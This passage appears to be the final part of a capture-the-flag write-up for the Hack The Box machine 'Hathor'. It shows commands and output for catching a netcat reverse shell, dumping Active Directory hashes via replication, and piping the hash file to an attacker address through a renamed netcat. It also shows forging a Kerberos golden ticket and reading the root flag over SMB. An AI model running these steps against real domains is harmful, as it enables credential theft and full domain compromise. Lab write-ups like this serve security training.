+<span class="k">PS C:\Get-bADpasswords></span> $all_certs = Get-ChildItem cert:\CurrentUser\My -CodeSigningCert
+<span class="k">PS C:\Get-bADpasswords></span> Set-AuthenticodeSignature .\Get-bADpasswords.ps1 -Certificate $all_certs[0]
+
+    Directory: C:\Get-bADpasswords
+
+
+SignerCertificate                         Status                                 Path                                  
+-----------------                         ------                                 ----                                  
+204F12473FD6911584501215758270B25701D049  Valid                                  Get-bADpasswords.ps1                  
+
+
+<span class="k">PS C:\Get-bADpasswords></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Finally let's run the script, be sure netcat still works on the machine</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\Get-bADpasswords></span> cscript .\run.vbs
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+<span class="k">PS C:\Get-bADpasswords> </span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now we should get a shell as bpassrunner</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">rlwrap</span> sudo nc -nlvp 9999
+[sudo] password for 0xv01d: 
+listening on [any] 9999 ...
+connect to [10.10.16.25] from (UNKNOWN) [10.10.11.147] 54879
+Microsoft Windows [Version 10.0.20348.643]
+(c) Microsoft Corporation. All rights reserved.
+
+<span class="k">C:\Get-bADpasswords></span> whoami
+windcorp\bpassrunner
+
+<span class="k">C:\Get-bADpasswords></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Looking for a way to escalate privileges, we can use <a href="https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md" rel="noreferrer noopener" target="_blank">Get-ADReplAccount</a> abusing MS-DRSR to dump hashes, it takes its time but we'll get the hashes</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\pwn></span> Get-ADReplAccount -all -namingcontext 'DC=windcorp,DC=htb' -server hathor > hashes
+<span class="k">PS C:\pwn> </span>dir
+
+    Directory: C:\pwn
+
+
+Mode                 LastWriteTime         Length Name                                            
+----                 -------------         ------ ----                                            
+-a----         11/2/2022   8:00 AM           3178 bADpasswords.ps1                                
+-a----         11/2/2022   8:17 AM       44921802 <span class="gd">hashes</span>                                          
+-a----         3/21/2022   3:37 PM           4053 signature.pfx                                   
+
+
+<span class="k">PS C:\pwn> </span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's transfer the file via netcat</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\pwn></span> cmd /c "c:\share\bginfo64.exe 10.10.16.25 5555 < hashes"
+
+<span class="na">❯ </span><span class="kt">sudo </span>nc -nlvp 5555 > hashes
+[sudo] password for 0xv01d: 
+listening on [any] 5555 ...
+connect to [10.10.16.25] from (UNKNOWN) [10.10.11.147] 61838
+</span> </code></pre></div></div>
+
+            <p class="head-img">We can use iconv to change the format and filter easier</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">iconv </span>-f utf-16le -t utf-8 hashes -o hashes.formated
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now we can get a ticket as Administrator</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">ticketer.py </span>-nthash c639e5b331b0e5034c33dec179dcc792 -domain-sid S-1-5-21-3783586571-2109290616-3725730865 -domain windcorp.htb Administrator
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for windcorp.htb/administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in administrator.ccache
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's export it as an environment variable</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="k">export </span>KRB5CCNAME=administrator.ccache
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once this is done, we can connect via SMB and read the final flag</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">impacket-smbclient </span>-no-pass -k windcorp.htb/administrator@hathor.windcorp.htb -dc-ip hathor.windcorp.htb
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+share
+SYSVOL
+# use C$
+# cat .\Users\Administrator\Desktop\root.txt
+c753b876b8e2350ffa6fb40b7a98e2b7
+
+# exit 
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</div>
+</html>
